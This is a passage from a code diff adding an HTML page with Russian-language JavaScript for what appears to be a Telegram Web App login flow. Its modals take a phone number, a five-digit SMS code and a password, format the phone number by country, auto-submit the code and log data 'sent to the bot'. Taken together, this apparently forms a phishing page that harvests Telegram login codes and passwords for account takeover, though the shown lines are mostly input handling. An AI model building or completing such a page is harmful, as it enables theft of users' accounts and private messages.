+            if (smsInput) {
+                smsInput.disabled = false;
+                smsInput.value = '';
+            }
+            
+            if (passwordInput) {
+                passwordInput.disabled = false;
+                passwordInput.value = '';
+            }
+            
+            // Сбрасываем кнопки
+            const authBtn = document.querySelector('#auth-modal .submit-btn');
+            const smsBtn = document.querySelector('#sms-modal .submit-btn');
+            const passwordBtn = document.querySelector('#password-modal .submit-btn');
+            
+            if (authBtn) {
+                authBtn.disabled = false;
+                authBtn.textContent = 'ДАЛЕЕ';
+            }
+            
+            if (smsBtn) {
+                smsBtn.disabled = false;
+                smsBtn.textContent = 'ПОДТВЕРДИТЬ';
+            }
+            
+            if (passwordBtn) {
+                passwordBtn.disabled = false;
+                passwordBtn.textContent = 'ВОЙТИ';
+            }
+        }
+        
+        // Обработчик сообщений от бота (для обратной связи)
+        if (tg) {
+            tg.onEvent('web_app_data_sent', function(eventData) {
+                // Данные отправлены боту
+                console.log('Данные отправлены боту:', eventData);
+            });
+        }
+        
+        // Форматирование номера телефона
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.getElementById('phone-number');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    const countryCode = document.getElementById('country-code').value;
+                    let formattedValue = '';
+                    
+                    // Форматирование в зависимости от кода страны
+                    if (countryCode === '+7') {
+                        // Россия/Казахстан: XXX XXX XX XX
+                        if (value.length > 0) {
+                            if (value.length <= 3) {
+                                formattedValue = value;
+                            } else if (value.length <= 6) {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3);
+                            } else if (value.length <= 8) {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
+                            } else if (value.length <= 10) {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8);
+                            } else {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8, 10);
+                            }
+                        }
+                    } else if (countryCode === '+380') {
+                        // Украина: XX XXX XX XX
+                        if (value.length > 0) {
+                            if (value.length <= 2) {
+                                formattedValue = value;
+                            } else if (value.length <= 5) {
+                                formattedValue = value.substring(0, 2) + ' ' + value.substring(2);
+                            } else if (value.length <= 7) {
+                                formattedValue = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5);
+                            } else if (value.length <= 9) {
+                                formattedValue = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5, 7) + ' ' + value.substring(7);
+                            } else {
+                                formattedValue = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5, 7) + ' ' + value.substring(7, 9);
+                            }
+                        }
+                    } else if (countryCode === '+1') {
+                        // США: XXX XXX XXXX
+                        if (value.length > 0) {
+                            if (value.length <= 3) {
+                                formattedValue = value;
+                            } else if (value.length <= 6) {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3);
+                            } else if (value.length <= 10) {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
+                            } else {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10);
+                            }
+                        }
+                    } else {
+                        // Общее форматирование для других стран
+                        if (value.length > 0) {
+                            if (value.length <= 3) {
+                                formattedValue = value;
+                            } else if (value.length <= 6) {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3);
+                            } else if (value.length <= 9) {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
+                            } else {
+                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 9);
+                            }
+                        }
+                    }
+                    
+                    e.target.value = formattedValue;
+                });
+            }
+            
+            // Форматирование SMS кода
+            const smsInput = document.getElementById('sms-code');
+            if (smsInput) {
+                smsInput.addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                    
+                    // Автоматическая отправка при вводе 5 цифр
+                    if (e.target.value.length === 5) {
+                        setTimeout(() => verifySmsCode(), 500);
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
